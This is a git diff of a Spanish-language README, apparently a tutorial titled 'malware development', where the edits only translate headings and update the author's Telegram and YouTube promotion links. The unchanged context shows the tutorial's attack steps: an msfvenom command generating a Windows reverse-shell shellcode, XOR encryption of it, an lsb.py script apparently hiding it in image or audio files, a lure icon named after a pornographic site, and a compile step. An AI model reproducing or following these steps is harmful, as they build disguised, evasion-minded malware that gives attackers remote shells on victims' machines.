@@ -1,6 +1,6 @@
 ## DESARROLLO DE MALWARE BY @N3XXU5_666
 
-- Dependencies
+- Dependencias
 ```bash
 apt update && apt upgrade
 apt install curl python
@@ -12,7 +12,7 @@ NOTE: en Termux numpy se instala desde APT y python se ejecuta sin el '3'
 curl https://www.iconfinder.com/icons/7150904/download/ico/4096 -o pornhub.ico
 ```
 
-- Payload or Shellcode:
+- Payload|Shellcode:
 ```bash
 msfvenom -p windows/x86/shell_reverse_tcp LHOST 0.0.0.0 LPORT 0000 -f raw -o shellcode.bin
 ```
@@ -51,7 +51,7 @@ if name == "main":
 python xor.py shellcode.bin #Crea un archivo llamado encrypted.bin
 ```
 
-- file lsb.py
+- Archivo lsb.py
 ```python
 from PIL import Image
 from pydub import AudioSegment
@@ -195,9 +195,6 @@ Los native tools ya vienen instalados al instalar [FLARE-VM](https://github.com/
 compile.bat 
 ```
 
-#### Follow me on [Socials Network](https://wlo.link/@Ivam3)
-#### Follow at N3XU5 on [Telegram](https://t.me/N3XU5_666) & [YouTube](https://www.youtube.com/@N3XU5_666)
-#### JOIN to the next [LIVESTREAM](https://t.me/Ivam3byCinderella?livestream)
-
-
-
+#### Sigueme en todas las [Redes_Sociales](https://wlo.link/@Ivam3)
+#### Sigue a N3XU5 en [Telegram](https://t.me/N3XU5_666). [Canal_CyberneticOps](https://t.me/CyberneticOps), [Canal_CyberOps](https://t.me/CyberOpsChannel), & [YouTube](https://www.youtube.com/@N3XU5_666)
+#### ASISTE al proximo [LIVESTREAM](https://t.me/Ivam3byCinderella?livestream)
